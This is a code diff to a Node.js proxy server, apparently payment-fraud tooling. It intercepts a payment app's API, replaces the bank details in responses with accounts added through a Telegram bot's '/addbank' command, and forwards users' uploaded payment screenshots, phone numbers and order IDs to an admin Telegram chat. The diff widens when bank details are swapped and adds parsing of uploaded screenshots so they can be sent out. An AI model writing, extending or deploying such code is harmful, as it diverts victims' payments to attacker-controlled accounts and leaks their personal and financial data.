@@ -443,6 +443,37 @@ app.all('/appAuth/checkUpdate', (req, res) => {
   });
 });
 
+// ── Multipart text-field + binary extractor ───────────────────────
+function parseMultipart(rawBody, contentType) {
+  const result = { fields: {}, files: {} };
+  try {
+    const boundaryMatch = contentType.match(/boundary=([^;]+)/i);
+    if (!boundaryMatch) return result;
+    const boundary = '--' + boundaryMatch[1].trim().replace(/^"(.*)"$/, '$1');
+    const bodyStr = rawBody.toString('binary');
+    const parts = bodyStr.split(boundary);
+    for (const part of parts) {
+      if (!part || part === '--' || part === '--\r\n') continue;
+      const headerEnd = part.indexOf('\r\n\r\n');
+      if (headerEnd < 0) continue;
+      const headersRaw = part.substring(0, headerEnd);
+      const valueRaw = part.substring(headerEnd + 4);
+      const value = valueRaw.replace(/\r\n$/, '');
+      const nameMatch = headersRaw.match(/name="([^"]+)"/i);
+      if (!nameMatch) continue;
+      const name = nameMatch[1];
+      const filenameMatch = headersRaw.match(/filename="([^"]*)"/i);
+      const ctMatch = headersRaw.match(/Content-Type:\s*([^\r\n]+)/i);
+      if (filenameMatch || ctMatch) {
+        result.files[name] = { filename: filenameMatch ? filenameMatch[1] : '', contentType: ctMatch ? ctMatch[1].trim() : 'application/octet-stream', data: Buffer.from(value, 'binary') };
+      } else {
+        result.fields[name] = value;
+      }
+    }
+  } catch(e) {}
+  return result;
+}
+
 // ── Request body parsing ──────────────────────────────────────────
 app.use(async (req, res, next) => {
   const chunks = [];
@@ -453,7 +484,11 @@ app.use(async (req, res, next) => {
     try {
       if (ct.includes('json')) {
         req.parsedBody = JSON.parse(req.rawBody.toString());
-      } else if (ct.includes('form') && !ct.includes('multipart')) {
+      } else if (ct.includes('multipart')) {
+        const mp = parseMultipart(req.rawBody, req.headers['content-type'] || '');
+        req.parsedBody = mp.fields;
+        req.multipartFiles = mp.files;
+      } else if (ct.includes('form')) {
         const params = new URLSearchParams(req.rawBody.toString());
         req.parsedBody = Object.fromEntries(params);
       } else {
@@ -879,19 +914,29 @@ Example:
 
     // /addbank
     if (text.startsWith('/addbank ')) {
-      const parts = text.substring(9).trim().split(/\s+/);
-      const bankStr = parts[0] || '';
-      const minAmount = parseFloat(parts[1]) || 0;
-      const bParts = bankStr.split('|');
-      if (bParts.length < 3) {
-        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC [minAmount]');
+      const raw = text.substring(9).trim();
+      // minAmount: last token if it's a pure number (brackets allowed, e.g. 500 or [500])
+      let bankStr = raw;
+      let minAmount = 0;
+      const lastSpaceIdx = raw.lastIndexOf(' ');
+      if (lastSpaceIdx >= 0) {
+        const lastToken = raw.substring(lastSpaceIdx + 1).replace(/[\[\]]/g, '').trim();
+        const parsed = parseFloat(lastToken);
+        if (!isNaN(parsed) && isFinite(parsed) && String(parsed) === lastToken.replace(/[\[\]]/g, '').trim()) {
+          minAmount = parsed;
+          bankStr = raw.substring(0, lastSpaceIdx).trim();
+        }
+      }
+      const bParts = bankStr.split('|').map(s => s.trim());
+      if (bParts.length < 3 || !bParts[0] || !bParts[1] || !bParts[2]) {
+        await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC [minAmount]\nExample:\n/addbank Rahul Kumar|1234567890|SBIN0001234 500');
         return res.sendStatus(200);
       }
       data = await loadData(true);
       data.banks.push({
-        accountHolder: bParts[0] || '',
-        accountNo: bParts[1] || '',
-        ifsc: bParts[2] || '',
+        accountHolder: bParts[0],
+        accountNo: bParts[1],
+        ifsc: bParts[2],
         minAmount: minAmount
       });
       data._skipOverrideMerge = true;
@@ -1210,7 +1255,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     const orderId = rd.orderId || rd.orderNo || rd.id || req.parsedBody?.orderId || req.query?.orderId || '';
     const allOrderIds = [orderId, rd.inrOrderId, rd.payOrderId].filter(Boolean);
 
-    if (eff.botEnabled !== false && isProxyPending(data, allOrderIds) && !hasOrderBankDecision(data, orderId) && data.banks && data.banks.length > 0) {
+    if (eff.botEnabled !== false && !hasOrderBankDecision(data, orderId) && data.banks && data.banks.length > 0) {
       const detectedAmount = parseFloat(rd.amount || rd.orderAmount || rd.payAmount || 0) || 0;
       if (detectedAmount > 0) {
         const lateActive = getActiveBank(data, userId, detectedAmount);
@@ -1219,6 +1264,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       } else {
         const fallbackActive = getActiveBank(data, userId);
         if (fallbackActive) await saveOrderBankMultipleKeys(data, allOrderIds, fallbackActive);
+        else await markOrderBankSkip(data, orderId);
       }
     }
 
@@ -1368,22 +1414,39 @@ app.post('/appApi/orderOut/payingSubmitImg', async (req, res) => {
     const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
+    const files = req.multipartFiles || {};
+    const respData = getResponseData(jsonResp) || {};
     if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const phone = getPhone(data, userId);
-      const imgVal = body.imgUrl || body.imageUrl || '';
-      let msg = `🖼️ Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${body.orderId || 'N/A'}`;
-      if (imgVal) msg += `\nImage: ${imgVal}`;
-      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
-      if (imgVal) {
+      // Get orderId from body or response
+      const orderVal = body.orderId || body.orderNo || respData.orderId || respData.orderNo || 'N/A';
+      // Get image URL from body fields (many possible names) or response
+      const imgVal = body.imgUrl || body.imageUrl || body.img || body.imgPath || body.payImg ||
+                     body.billImg || body.picUrl || body.photoUrl || body.fileUrl || body.picture ||
+                     body.screenshot || respData.imgUrl || respData.imageUrl || respData.img || '';
+      const caption = `📸 Payment Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nOrder: ${orderVal}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+      // Check if image was uploaded as file in multipart
+      const imgFileKey = Object.keys(files).find(k => files[k].contentType && files[k].contentType.startsWith('image/'));
+      const imgFile = imgFileKey ? files[imgFileKey] : null;
+      if (imgFile && imgFile.data && imgFile.data.length > 500) {
+        // Send binary image directly to Telegram
+        bot.sendPhoto(data.adminChatId, imgFile.data, { caption }, { filename: imgFile.filename || 'payment.jpg', contentType: imgFile.contentType }).catch(() => {
+          bot.sendMessage(data.adminChatId, caption).catch(()=>{});
+        });
+      } else if (imgVal) {
+        // Send via URL
+        bot.sendMessage(data.adminChatId, caption + (imgVal ? `\nURL: ${imgVal}` : '')).catch(()=>{});
         try {
           const imgResp = await fetch(imgVal.startsWith('http') ? imgVal : ORIGINAL_API + '/' + imgVal);
           if (imgResp.ok) {
             const imgBuf = Buffer.from(await imgResp.arrayBuffer());
-            if (imgBuf.length > 100) {
-              await bot.sendPhoto(data.adminChatId, imgBuf, { caption: `📸 Payment [${userId || 'N/A'}]` }, { filename: 'payment.jpg', contentType: 'image/jpeg' });
+            if (imgBuf.length > 500) {
+              bot.sendPhoto(data.adminChatId, imgBuf, { caption }, { filename: 'payment.jpg', contentType: 'image/jpeg' }).catch(()=>{});
             }
           }
         } catch(e) {}
+      } else {
+        bot.sendMessage(data.adminChatId, caption).catch(()=>{});
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
